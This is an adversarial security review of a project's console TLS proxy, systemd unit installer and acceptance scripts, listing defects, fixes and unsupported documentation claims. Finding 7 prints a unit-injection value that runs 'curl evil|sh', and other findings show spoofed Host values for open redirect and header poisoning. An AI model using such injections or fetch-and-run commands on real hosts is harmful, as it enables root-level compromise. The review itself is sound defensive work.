# Adversarial review 2: console TLS termination, supervisor-unit install, and server acceptance

Date: 2026-09-20
Reviewer: independent adversarial pass (static reading plus read-only unit tests)
Scope (everything added after `docs/reviews/target-and-deployment-review.md`):
`deploy/console-tls-proxy.ts`, `deploy/server-acceptance.sh`, `lab/tls_termination_check.py`,
`lab/supervised_run_check.py`, `lab/console_build_check.py`, `lab/pinned_images_check.py`,
`install_server.py` (`UNIT_ANCHORS`/`rendered_unit`/`unit_commands`/`supervise` and the new
CLI), the freshness skip in `lab/dev.py`, and the new `lab/deployment_rehearsal.py` behaviour
(host facts, unit status, startup attempts/retries, the bootstrap step, evidence-path
selection). `docs/DEPLOYMENT-READINESS.md` and `docs/SERVER-DEPLOYMENT.md` were read against
their evidence files.

Method: every file above was read in full. Supporting files read to establish what the code
actually reaches: `deploy/sbarbase.service`, `lab/ui-static.ts`, `lab/tls_upstream_stub.ts`,
`lab/console-serve-check.ts`, `lab/bootstrap-check.ts`, `vite.config.mts`, `package.json`,
`tsconfig.json`, the three lock files, `docs/evidence/{deployment-rehearsal,tls-termination,
supervised-run,supervisor-unit,console-build,console-serve,pinned-images,bootstrap-checks,
combined-runtime-admission,source-stage-footprint}.json`, and the new test modules.
Read-only commands run: `/usr/bin/python3 -m unittest` on `test_tls_termination`,
`test_supervised_run`, `test_console_build`, `test_console_freshness`, `test_pinned_images`,
`test_deployment_rehearsal`, `test_install_server`, `test_server_acceptance`,
`test_supervisor_unit` (69 tests, all OK); `/usr/bin/python3 lab/install_server.py check`
(read-only); the proxy's two refusal-before-bind paths. **No container was started, no service
was started, nothing was installed, and no repository file other than this review is modified**
(the one file a test rewrites, `docs/evidence/supervisor-unit.json`, was restored with
`git checkout --` and the tree is clean).

Findings are ordered by severity. Each names file:line and the minimal fix. Section 2 lists the
claims in the two status documents that the committed evidence does not support; section 3 lists
what I could not falsify.

---

## 1. Must-fix defects

### 1. The documented acceptance command `--rehearse --install-unit` cannot pass

Evidence: `deploy/server-acceptance.sh:10` (the usage example),
`deploy/server-acceptance.sh:79-101`, `lab/deployment_rehearsal.py:149-158,166-179`,
`lab/install_server.py:180-185`.

The script installs and *starts* the unit (`install_server.py supervise --apply`, then
`systemctl is-active --quiet sbarbase.service`) and only then runs the rehearsal. The rehearsal
begins with `install_server.preflight()` and returns immediately on any blocker
(`deployment_rehearsal.py:149-153`). Two independent mechanisms then guarantee a failure:

1. `install_server.state()` (`lab/install_server.py:180-185`) emits the blocker
   *"Owned containers are already running; stop or supervise them instead of installing"* as
   soon as `docker ps --filter label=io.sbarbase.owner=durable-upstream -q` is non-empty — which
   is exactly the state `dev.py` under the freshly started unit creates.
2. If the containers have not been created yet (the rehearsal starts within a second or two of
   `enable --now`, while `dev.py` is still in its settle stage), the rehearsal passes preflight
   and then starts its own `lab/dev.py`, which loses the `supervisor.lock` race and exits with
   *"Another local installation runner is active."* (`lab/dev.py:142-146`). `start_supervisor`
   treats the exit as a startup failure and the attempt budget is exhausted
   (`deployment_rehearsal.py:166-177`).

So the command in `deploy/server-acceptance.sh:10` and `docs/SERVER-DEPLOYMENT.md:109-111`
always exits non-zero. The same is true of the plain `--rehearse` form on any host where the
unit is already installed and running.

Minimal fix: never let the rehearsal run while the unit is active. After line 84 of
`server-acceptance.sh`, stop the service (`systemctl stop sbarbase.service`), keep `--skip-install`
out of the rehearsal arguments so nothing re-creates the containers behind it, and re-assert
`systemctl is-active sbarbase.service` as a final step after the rehearsal. State this order in
the usage header and in `docs/SERVER-DEPLOYMENT.md`.

Related trap in the same sequence: after that stop, the moved-host path (`install()` →
`preflight()` → `state()`) still blocks on *"Retained source has no generation pin"* for
containers the unit just created. On this host today, `install_server.py check` prints
`Preflight: 1 blocker(s)` and that blocker *is* the retained-source pin, so the rehearsal is
state-dependent in a way the acceptance run does not manage.

### 2. The redirect trusts the `Host` header (open redirect, host-header poisoning)

Evidence: `deploy/console-tls-proxy.ts:134,136`.

```
134|    const host = options.publicHost ?? request.headers.get('host') ?? 'localhost';
136|    return new Response(null, {status: 308, headers: {location: 'https://' + host + url.pathname + url.search}});
```

With no `--public-host`, the `Location` of the 308 is built from an unvalidated, client-supplied
`Host`. A request with `Host: attacker.example` is answered
`Location: https://attacker.example/<path>`; because 308 preserves method and body, a victim
POSTing to the console's HTTP port has its body relayed to the attacker. The value is also never
range-checked for `@`, `:` or whitespace, so `Host: good.com@evil.com` yields
`https://good.com@evil.com/...` (userinfo + attacker authority).

The committed evidence proves the reflection happens and that the check cannot see it:
`docs/evidence/tls-termination.json` records `plain HTTP is redirected to HTTPS | status 308
location https://127.0.0.1:54699/some/path?x=1` — the redirect points at **the HTTP port over
`https`**, i.e. a dead end, and no check exercises `--public-host` at all.

Minimal fix: make `--public-host` mandatory for the redirect (refuse to serve the HTTP port
without it), and validate it as a bare `host[:port]` with no `@`, `/`, whitespace or control
characters. Fold the `Host` fallback into a rejection.

### 3. The proxy sets `X-Forwarded-Host` from the untrusted `Host` header

Evidence: `deploy/console-tls-proxy.ts:78-79,111-112`.

```
78|  const host = request.headers.get('host');
79|  if (host) headers['x-forwarded-host'] = host;
```

`securityHeaders()` is both returned to the client and merged into the upstream request, so an
arbitrary `Host` is forwarded to the console as `X-Forwarded-Host`. Any absolute-URL or
password-reset link the console builds from that header points at the attacker. It is the same
root cause as finding 2; the fix is the same validation, plus dropping `X-Forwarded-Host`
entirely (nothing in the console consumes it — the console refuses non-loopback hosts on its own,
`lab/console-serve-check.ts:35-36`).

### 4. Hop-by-hop headers are forwarded while the body and response are re-framed (smuggling)

Evidence: `deploy/console-tls-proxy.ts:108-120`.

```
111|          ...Object.fromEntries([...request.headers].filter(([name]) => !['host', 'connection', 'upgrade'].includes(name.toLowerCase()))),
114|        body: ['GET', 'HEAD'].includes(request.method) ? undefined : await request.arrayBuffer(),
118|      const headers = new Headers(forwarded.headers);
120|      response = new Response(forwarded.body, {status: forwarded.status, headers});
```

The filter removes only three hop-by-hop headers. `transfer-encoding`, `content-length`, `te`,
`trailer` and `keep-alive` reach the upstream while the body is replaced by a buffered copy, and
on the way back the upstream's `content-length`/`transfer-encoding` are copied into a response
whose body is a re-framed stream. A client-declared `Transfer-Encoding: chunked` (or a
`Content-Length` that disagrees with the buffered body) is a classic request-smuggling setup
against the loopback console, which is the one component the operator is told not to expose
directly.

Minimal fix: strip the full hop-by-hop set on both directions and delete
`content-length`/`transfer-encoding` when building both the upstream request and the downstream
response (let the runtime re-frame). Keep the existing `x-forwarded-proto`/`x-forwarded-host`
overwrite, and additionally drop any client-supplied `x-forwarded-for`/`x-forwarded-proto`
before forwarding.

### 5. Request bodies are buffered without a limit

Evidence: `deploy/console-tls-proxy.ts:114`.

Every non-GET/HEAD body is read fully into memory before being forwarded, with no cap. Bun's
default `maxRequestBodySize` (128 MiB) multiplied by concurrency is enough to OOM a small server,
and the proxy is the only component exposed to the network. Minimal fix: reject a body over a
small configured limit (via `Content-Length` up front and a `request.body` reader cap), or stream
`request.body` straight through instead of buffering.

### 6. `supervise --apply` exits 0 when the installed unit never became active

Evidence: `lab/install_server.py:371,380,387,400`.

```
371|        applied=subprocess.run(['systemctl','is-active','sbarbase.service'],...).stdout.strip()=='active'
380|              ... 'applied':applied, ... 'passed':bool(verified)}
387|    return evidence['passed']
```

`passed` reflects only `systemd-analyze verify`. If `enable --now` succeeds but the unit
immediately fails (a wrong `--service-user`, an unreachable Docker socket), the CLI prints
"unit installed but not active" and still exits 0, and the evidence file says `passed: true`
while `applied` is `false`. `server-acceptance.sh:83` catches this, but the documented
`sudo lab/install_server.py supervise --apply` (`docs/SERVER-DEPLOYMENT.md:79`) does not.

Minimal fix: `'passed': bool(verified) and (not apply or applied)`.

### 7. `--service-user` / `--home` / `--bun-dir` are interpolated into the unit unvalidated

Evidence: `lab/install_server.py:332-338,352-357`.

The values arrive straight from argv and are concatenated into unit directives that
`--apply` then installs at `/etc/systemd/system` as root. A value containing a newline (or a
systemd specifier such as `%h`, which is expanded at runtime) injects or rewrites directives:

```
sudo lab/install_server.py supervise --apply \
    --service-user "$(printf 'sbarbase\nExecStartPre=/bin/sh -c "curl evil|sh"')"
```

The rewrite guard only checks the *shipped* text for anchors; it never checks the substituted
values. Minimal fix: reject `user`, `home` and `bun_dir` unless they match
`^[A-Za-z0-9_][A-Za-z0-9_.-]*$` / an absolute path with no whitespace, control characters,
`%` or `\`.

### 8. A missing `bun` silently renders a unit with the wrong `PATH`

Evidence: `lab/install_server.py:356`.

```
356|    bun_dir=bun_dir or str(Path(_shutil.which('bun') or '/usr/bin/bun').parent)
```

When `which('bun')` fails — routine under `sudo`, whose secure `PATH` usually excludes
`~/.bun/bin` — the renderer substitutes `/usr/bin`, so the installed unit's `PATH` may omit the
real Bun directory. `ExecStartPre` then fails at the preflight inside the service while the
render is reported as verified. `rendered_unit` refuses an *empty* Bun directory
(`install_server.py:326`) but not a wrong one. Minimal fix: `raise SystemExit` when
`shutil.which('bun')` is `None`, and say so; make `--bun-dir` the explicit override.

### 9. The recorded "exact install commands" contain a placeholder

Evidence: `lab/install_server.py:344-349`; claim in `docs/DEPLOYMENT-READINESS.md:13`
("the exact install commands are recorded") and `docs/SERVER-DEPLOYMENT.md:82`.

```
346|    return ['sudo install -m 0644 <rendered unit> '+str(SERVICE_UNIT_PATH), ...]
```

`docs/evidence/supervisor-unit.json` therefore records a first command that cannot be pasted or
run. Minimal fix: write the rendered file to a fixed path (the code already does:
`.lab/rendered-sbarbase.service`) and put that path in the recorded command.

### 10. Two of the fifteen TLS checks cannot fail

Evidence: `lab/tls_termination_check.py:137,144`.

```
137|        record('stub upstream serving the real built page',True,'port '+stub_port)
144|        record('proxy announced its HTTPS port',proxy_match is not None,str(proxy_log[-1:]))
```

The stub check passes a literal `True`. The port check asserts `proxy_match is not None`, but
`start()` (`tls_termination_check.py:46-59`) only ever returns a match object — when the pattern
does not appear it raises `RuntimeError` after the timeout. Neither check can ever record a
failure; `docs/DEPLOYMENT-READINESS.md:18` cites "15 checks" as the proof for the TLS story.
Minimal fix: have `start()` return `(process, match, captured)` with `match` possibly `None` (or
return an explicit `None` on timeout) so both checks can fail, and keep the raise for callers
that need the port.

### 11. The redirect check cannot see the host/port defect it should catch

Evidence: `lab/tls_termination_check.py:170-173`.

```
171|            status,headers,_=fetch('http://127.0.0.1:'+http_port+'/some/path?x=1')
173|            record('plain HTTP is redirected to HTTPS',status==308 and location.startswith('https://'),...)
```

`startswith('https://')` is satisfied by the reflected-`Host`, wrong-port Location the proxy
actually produces (see finding 2 and the recorded detail
`location https://127.0.0.1:54699/some/path?x=1`). No check passes `--public-host`, so the only
configuration `docs/SERVER-DEPLOYMENT.md:168-174` tells operators to use is never exercised.
Minimal fix: start a second proxy instance (or re-run with `--public-host console.example.com`)
and assert the Location is exactly `https://console.example.com/some/path?x=1` and that a spoofed
`Host` cannot change it.

### 12. The supervised-path gate check passes on any gate output, including a refusal

Evidence: `lab/supervised_run_check.py:145-147` against `lab/install_server.py:200-205`.

```
146|        record('the preflight gate ran under systemd',('Preflight:' in gate) or ('blocker' in gate), ...)
```

`install_server.report()` always prints `Preflight: N blocker(s), M action(s)`, so the string
`Preflight:` (and `blocker`) is present whether the gate admitted or refused the host. The check
is therefore true whenever `install_server.py check` ran at all, and no refusal path is ever
observed (a host that should be refused would still record a green gate). The committed evidence
shows exactly that: the matched line is the summary
`... Local Sbarbase API: http://127.0.0.1:44627` is the *last* journal line, and the match came
from the earlier `Preflight: 0 blocker(s)` line. Minimal fix: require `'Preflight: 0 blocker(s)'`
in the journal (and add a case that proves a refused gate leaves the unit not-started).

### 13. `wait_for_console` accepts state left by an earlier foreground run

Evidence: `lab/supervised_run_check.py:98-108,135-143`.

`wait_for_console` returns any parseable `.lab/upstream/supervisor.json` + `server.json` pair
with a `pid` and a `url`; it never checks that the supervisor is the one systemd just started, or
that either pid is alive, or that the files are newer than the `systemctl start`. A stale pair
from a manual `lab/dev.py` run makes "systemd started the supervisor and the console" (and, with
the containers still up, "owned containers were started by the unit") pass without systemd having
started anything. Minimal fix: record the state files' mtimes/`os.stat` before `systemctl start`,
and require both to be newer and both pids to be live (`os.kill(pid, 0)`) before recording.

### 14. The freshness gate ignores the real Vite config, so `dev.py` can reuse a stale console

Evidence: `lab/console_build_check.py:57,64,75` and `lab/dev.py:157-162`.

```
 57|def newest_source_mtime(roots=('ui','vite.config.ts','vite.config.js','package.json','tsconfig.json','index.html')):
 64|                if candidate.is_file() and candidate.suffix in ('.ts','.tsx','.js','.jsx','.css','.html','.json'):
```

The repository's build configuration is `vite.config.mts` (it is the file `vite build` reads and
it is in `tsconfig.json`'s `include`). It is neither in the root list nor covered by the suffix
filter (`.mts`/`.mjs` are absent), so changing `outDir`, `root`, a `define` or a plugin does not
mark the build stale; `dev.py` then prints "console build up to date" and serves the previous
bundle. The test that is supposed to guard this (`lab/test_console_freshness.py:53-56`) only
asserts `newest_source_mtime(('ui','vite.config.ts','package.json')) > 0`, which `ui/` alone
satisfies. Minimal fix: include `vite.config.mts`/`vite.config.mjs` and add the `.mts`/`.mjs`
(plus `.scss`, `.svg`, `.map`) suffixes, or hash the config file and the built page instead of
comparing mtimes.

### 15. A check that cannot fail inside the rehearsal's retry accounting

Evidence: `lab/deployment_rehearsal.py:174-177`.

```
176|            findings.append({'check':'startup attempts before refusal','ok':True,'detail':str(len(refusals))})
```

When every startup attempt fails, the run records the failure *and* an unconditional green check,
so the evidence shows a passing check in the same run that reports the refusal (the assertion
`test_exhausting_the_attempts_reports_how_many_were_made` locks this in). Minimal fix: move the
attempt count out of `checks` into a `startup` field of the evidence, or set `ok` from whether
the retry budget was used as intended.

### 16. "supervisor unit file verifies" verifies the repository template, not the installed unit

Evidence: `lab/deployment_rehearsal.py:113-127,194-200`.

`unit_status()` runs `systemd-analyze verify ROOT/deploy/sbarbase.service` — the checkout's
template — while the rehearsal records it as *'supervisor unit file verifies'* on a host where
`/etc/systemd/system/sbarbase.service` is what runs, and `docs/SERVER-DEPLOYMENT.md:122-127` says
"a green run means the unit was present, enabled and verified". The installed file is never
verified (it may have been edited, or rendered for a different root/user). Minimal fix: when
`path.exists()`, verify `path`; keep the template verification only as a fallback and label it.

### 17. The evidence records the operator's bootstrap-file path

Evidence: `lab/deployment_rehearsal.py:234`; copied into a committed file by
`deploy/server-acceptance.sh:106`.

```
234|              'command':' '.join(['/usr/bin/python3','lab/deployment_rehearsal.py']+sys.argv[1:]),
```

`sys.argv[1:]` includes `--bootstrap-file /root/sbarbase-operator.json`. That contradicts
`deploy/server-acceptance.sh:12` ("only whether a bootstrap file was used") and
`docs/SERVER-DEPLOYMENT.md:41` ("it never prints a secret"), and the value is persisted into
`docs/evidence/server-acceptance-latest.json`. Minimal fix: replace the value of any
`--bootstrap-file` argument with `<bootstrap-file>` when building the `command` field.

### 18. Two rehearsal tests execute the live bootstrap check

Evidence: `lab/test_deployment_rehearsal.py:91-110,121-138`.

Neither test patches `run_bootstrap_check`, and `rehearse()` reaches it whenever the supervisor
start is mocked to succeed, so the unit suite runs `bun lab/bootstrap-check.ts`
(`lab/deployment_rehearsal.py:130-140`) against whatever `.lab/upstream/management.json` and
`.secrets/upstream/runtime.json` happen to exist. On an installed host that creates a real Auth
operator and writes `.lab/upstream/bootstrap-verification.json`; `bootstrap-check.ts`'s cleanup
only removes the probe identity if it got far enough to learn its id, so a crash late in the
script leaves the probe account behind. On this host it fails harmlessly at
`bootstrap-check.ts:13` (no `.secrets/upstream`), which is why the suite is green here. Minimal
fix: `patch.object(rehearsal,'run_bootstrap_check',return_value=None)` in both tests.

### 19. The acceptance script's failure contract is not enforced for unguarded steps

Evidence: `deploy/server-acceptance.sh:16,88-95,106`.

`set -uo pipefail` omits `-e`, so the statement in the header ("Every step that fails stops the
run and exits non-zero", lines 12-13) holds only for the commands that carry `|| fail`. The
heredoc at 88-95 is explicitly `|| true`, and `cp` at 106 is unguarded. No injection or word
splitting was found: every expansion is quoted, `"$1"` is re-checked after `shift`, and the
array `rehearsal_args` is expanded as `"${rehearsal_args[@]}"`. Minimal fix: add `-e` (or guard
each remaining command) and drop the `|| true` in favour of an explicit check of
`supervisor-unit.json`.

### 20. Lower-severity items established by reading

- `lab/tls_termination_check.py:139` — `free_port()` is called twice and each call closes its
  socket, so both can return the same port; the proxy's second `Bun.serve` then fails and the
  whole check dies with a traceback instead of recording a failure. Bind both sockets before
  choosing.
- `deploy/console-tls-proxy.ts:44-45` — `Number(values['https-port'] ?? 8443)` accepts `NaN`,
  `0` and negatives. Not security-relevant (the process refuses before binding when given a
  bad upstream) but it means `--https-port abc` produces a `Bun.serve` type error rather than a
  clear refusal.
- `lab/deployment_rehearsal.py:194,237` — `unit_status()` is evaluated twice (once for the
  check, once for the evidence), so the evidence's `unit` block can disagree with the recorded
  checks. Compute it once.
- `lab/deployment_rehearsal.py:209,226` — `rehearse()` returns `findings, None`; the second
  value is always `None` and every caller ignores it.
- `lab/test_supervisor_unit.py:70-83` rewrites the tracked `docs/evidence/supervisor-unit.json`
  (a new `run_at`) every time the suite runs, so `bun run test` / the unittest suite leaves a
  dirty worktree. It also means the committed `passed: true` is re-derived by any test run
  rather than pinned to a reviewed artifact.
- `lab/install_server.py:368-371` uses `subprocess.run(..., check=True)`; a failing
  `systemctl enable --now` raises `CalledProcessError` with a traceback instead of the clean
  `SystemExit` the rest of the module uses.

---

## 2. Claims in the status documents that the committed evidence does not support

Each item names the claim and the evidence file that contradicts or fails to support it.

1. **`docs/DEPLOYMENT-READINESS.md:29`** — "HTTPS and network exposure | documented,
   operator-provided | ...; **no TLS termination is implemented or tested here**". Directly
   contradicted by line 18 of the same table ("HTTPS termination | passed on this host, 15
   checks") and by `docs/evidence/tls-termination.json`. One of the two rows is stale; line 29
   is the wrong one.
2. **`docs/DEPLOYMENT-READINESS.md:27`** — "the deployment rehearsal ... current run records
   `Host headroom insufficient` without starting anything, `docs/evidence/deployment-rehearsal.json`".
   The committed file records `passed: true`, `count: 11`, `command:
   /usr/bin/python3 lab/deployment_rehearsal.py --skip-install --attempts 2 --attempt-delay 20`,
   `started_at 2026-09-20T16:38:46+04:00`, `finished_at 16:39:09`, and a green
   `host preflight passed`. No refusal is recorded anywhere in it. Contradicted by the file it
   cites.
3. **`docs/DEPLOYMENT-READINESS.md:12`** — "on this host it reports exactly one host-capacity
   blocker and the retained-installation actions". Run today, `lab/install_server.py check`
   prints `Preflight: 1 blocker(s), 1 action(s)` and the single blocker is
   *"Retained source has no generation pin"* — a state blocker, not a host-capacity one. The
   second half of the sentence ("the headroom requirement now names its composition") is
   supported by `lab/install_server.py:122-129` and the `docs/SERVER-DEPLOYMENT.md:23` wording.
4. **`docs/DEPLOYMENT-READINESS.md:17`** — "5888 MiB of container limits and 5.75 CPUs admitted
   at **9328 MiB available**". `docs/evidence/combined-runtime-admission.json` records
   `available_memory_mib: 8943` (the file was regenerated in commit `4f30866`, the same commit
   that refreshed the rehearsal), and `docs/evidence/deployment-rehearsal.json` records
   `mem_available_mib: 8202`. The 9328 figure appears only in prose
   (`docs/DEPLOYMENT-READINESS.md:17`, `docs/RESUME-CHECKPOINT.md:479`).
5. **`docs/DEPLOYMENT-READINESS.md:19`** — the rehearsal's bootstrap step is cited to
   `docs/evidence/bootstrap-checks.json`. Nothing in the repository writes that path: the
   rehearsal runs `bun lab/bootstrap-check.ts` (`lab/deployment_rehearsal.py:137`), which writes
   `.lab/upstream/bootstrap-verification.json` (`lab/bootstrap-check.ts`, final `Bun.write`).
   The committed `docs/evidence/bootstrap-checks.json` was last committed at 06:48 by `d2d3534`,
   hours before the rehearsal run at 16:38, so it is a copy from an earlier, separate run, not
   the artifact of the step it is cited for. (Its content — 18 checks, all `passed` — does match
   the scope string the script writes, and the rehearsal's own detail line says "18 live operator
   bootstrap checks passed", so the claim is plausible but the citation is wrong.)
6. **`docs/DEPLOYMENT-READINESS.md:11`** — "7 tests in `lab/test_server_acceptance.py`". The
   module defines 8 test methods. (The other test counts cited there are correct: 8 in
   `lab/test_console_build.py`, 6 in `lab/test_pinned_images.py`.)
7. **`docs/DEPLOYMENT-READINESS.md:15`** — the list of what the 11/11 run proves includes
   "supervised path". The corresponding check in `docs/evidence/deployment-rehearsal.json` is
   green only because it was not required: `"detail": "not required for this run: the supervisor
   was started directly, sbarbase.service is not installed"`, and the file's `unit` block is
   `{"installed": false, "enabled": null, "active": null, "verify": "not-run"}`. Nothing under
   systemd was exercised by that run. (The doc's own next sentence about `--require-unit` is
   accurate; the check list is what overstates.)
8. **`docs/DEPLOYMENT-READINESS.md:18` / `:21`** — the "15 checks" TLS story rests on two checks
   that cannot fail (finding 10), and the console static-serving story cites "traversal refusal",
   but `lab/console-serve-check.ts:52-55` sends `fetch(base+'/../src/http/local-server.ts')`,
   which the client normalises to `/src/http/local-server.ts` before it ever leaves the process;
   the request that reaches the server is not a traversal, so the check proves nothing about
   traversal refusal. The `ui-static.ts` allow-list (`/^\/assets\/[A-Za-z0-9_.-]+\.(js|css)$/`)
   is a real defence — the *check* is the part that cannot fail. (`lab/console-serve-check.ts` is
   outside the file list under review; it is reported here because the document cites it as
   evidence.)
9. **`docs/DEPLOYMENT-READINESS.md:13` / `docs/SERVER-DEPLOYMENT.md:82`** — "the exact install
   commands are recorded". The first recorded command contains the literal placeholder
   `<rendered unit>` (finding 9), so it is not runnable.
10. **`docs/SERVER-DEPLOYMENT.md:6-7`** — "The full source and target lifecycle rehearsal passes
    on the development host (**10 of 10 checks**, `docs/evidence/deployment-rehearsal.json`)".
    The cited file records `count: 11` and eleven check rows. `docs/DEPLOYMENT-READINESS.md:15`
    says 11 of 11 for the same file, so the two documents disagree and this one is wrong.
11. **`docs/SERVER-DEPLOYMENT.md:31-35`** — "One command on the server covers prerequisites,
    preflight, the full rehearsal and the acceptance evidence", immediately followed by an
    example that omits `--rehearse`; lines 41-43 and the script's own header
    (`deploy/server-acceptance.sh:6-7`) say that without `--rehearse` it stops after the
    preflight. The example command does not do what the sentence claims.
12. **`docs/SERVER-DEPLOYMENT.md:103-111`** — the `--install-unit` acceptance path. As shipped it
    cannot exit zero (finding 1), so "it renders and verifies the unit, installs and starts it,
    proves the console and the TLS termination, runs the rehearsal with the unit required, and
    leaves the evidence in one place" is not achievable.
13. **`docs/SERVER-DEPLOYMENT.md:122-127`** — "fails the ... check when
    `/etc/systemd/system/sbarbase.service` is not installed, so a green run means the unit was
    present, enabled and verified". The presence/enabled part is right; the "verified" part is
    not — what is verified is the checkout's template (finding 16).
14. **`docs/SERVER-DEPLOYMENT.md:178-179`** — "it refuses to start unless the certificate and key
    are regular files, the key is not group or world readable, **and the upstream is loopback (it
    takes the console URL from `.lab/upstream/server.json` when `--upstream` is omitted)**". The
    loopback assertion is applied to the `--upstream` value only
    (`deploy/console-tls-proxy.ts:95`); the value read from `server.json` is returned unvalidated
    (`:83-90,96`). The refusal claim is false in the default (no `--upstream`) configuration, and
    that path is untested.
15. **`docs/SERVER-DEPLOYMENT.md:164-166`** — the reference termination is "exercised by the test
    suite (`bun lab/tls_termination_check.py`, 15 checks)". `lab/tls_termination_check.py` is a
    Python module run with `/usr/bin/python3` (its own docstring says so); `bun` cannot run it.
    The command as written fails.
16. **`docs/SERVER-DEPLOYMENT.md:180-181`** — "logs only method, path and status: never bodies,
    query strings, cookies or credentials". True of `console.log` in
    `deploy/console-tls-proxy.ts:124,135` and of the check
    (`lab/test_tls_termination.py:36-41`), but the same request's `Host` is forwarded upstream as
    `X-Forwarded-Host` (finding 3), which the sentence's "never ... credentials" rhetoric is
    likely to be read as covering. Record as overstated rather than false.
17. **`docs/DEPLOYMENT-READINESS.md:14`** — "10 checks" for `docs/evidence/supervised-run.json`:
    matches the file. Correct, but note that one of those ten is the gate check of finding 12,
    which passes on any gate output, and the file's own detail for it is the last journal line
    rather than the matched one.

---

## 3. Claims I could not falsify

- **That the committed evidence files are records of real executions at their stated times.**
  `docs/evidence/{deployment-rehearsal,tls-termination,supervised-run,supervisor-unit,
  console-build,console-serve,pinned-images}.json` are internally consistent with the code that
  produces them (field names, check labels, scope strings) and with each other, but reproducing
  the runs means starting servers and containers, which this review deliberately did not do. I
  neither confirm nor dispute the timestamps; the claims that rest on them are marked in section
  2 only where another committed artifact contradicts them.
- **The suite sizes.** A static count of `def test_` in `lab/test_*.py` is 354, matching the
  stated Python figure, and the nine modules touched by this change (69 tests) pass under
  `/usr/bin/python3 -m unittest`. I did not run the full Python discovery or `bun run test`
  (73 tests), because parts of both execute the live checks.
- **`systemd-analyze verify` passes for the shipped unit** — verified: the read-only test
  `lab/test_deployment_rehearsal.py:51-55` passes, and it was re-run here.
- **`docs/evidence/supervisor-unit.json` `passed: true`** — re-derived: running
  `lab/test_supervisor_unit.py:70-83` regenerates the file with the same `verify: "passed"`,
  `applied: false`, `running_as_root: false` (then restored).
- **The proxy's three direct refusals** (world-readable key, non-loopback `--upstream`, missing
  `--cert`) — the two that can be exercised without writing a certificate file refuse before
  binding (`console-tls-proxy.ts:92` and `:95`), which I reproduced; the world-readable-key case
  is exercised by `lab/tls_termination_check.py:175-181` and recorded in
  `docs/evidence/tls-termination.json`. The **`server.json`-sourced upstream** is *not* refused
  (finding in 2.14) — that is the falsified part of the claim.
- **"No secret is printed."** I found no path that prints the bootstrap payload: it is read by
  `install_server.bootstrap_payload` (`:218-224`, `lstat`-guarded, regular file, owner, mode
  0600) and piped on stdin to `lab/bootstrap.py --stdin` (`:257-258`). The only leak I could
  establish is the bootstrap *path* in the rehearsal evidence (finding 17). Contents could still
  be echoed by `lab/bootstrap.py`'s own stderr on failure, which I did not execute.
- **Pins present and digest-matched on this host** — `docs/evidence/pinned-images.json` records
  5/5 at 15:32. I did not re-inspect the daemon (the check rewrites a tracked file); the
  digest-comparison logic is unit-tested (`lab/test_pinned_images.py`, 6 tests, pass).
- **The counted check totals** — 15 TLS, 10 supervised, 15 console-serve, 18 bootstrap, 5 pins,
  11 rehearsal all match the files. The counts are right; what some of the checks *prove* is the
  subject of section 2.
- **Capacity and load claims** — not claimed by either document; nothing to falsify.